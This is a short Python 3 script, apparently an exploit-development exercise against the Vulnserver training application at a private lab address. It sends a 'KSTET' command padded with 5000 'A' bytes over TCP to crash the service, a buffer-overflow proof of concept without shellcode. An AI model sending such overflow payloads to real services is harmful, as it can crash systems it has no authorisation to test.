#!/usr/bin/env python3

from socket import socket, AF_INET, SOCK_STREAM, timeout, error
from sys import exit

# CONSTANTS
rhost = "192.168.41.128"
rport = 9999
target = (rhost, rport)
timeout_val = 10  # seconds

# Bytes literals are always prefixed with 'b' or 'B'; they produce an instance
# of the bytes type instead of the str type. They may only contain ASCII
# characters; bytes with a numeric value of 128 or greater must be expressed
# with escapes.
# This is required to properly use the socket in Python 3 for exploitation
crash = b"A" * 5000

payload = b"KSTET /.:/"
payload += crash

if __name__ == '__main__':
    print('[*] creating the socket')
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(timeout_val)
    try:
        print('[*] connecting to the target')
        s.connect(target)
        print('[*] sending exploit')
        s.send(payload)
        print('[*] cleaning up')
        s.close()
    except timeout:
        print('[!] socket timeout occurred, is the application running?')
        print('\tensure the debugger is not in a paused state')
        exit(1)
    except error:
        print('[!] a socket error occurred, is the host up?')
        exit(1)
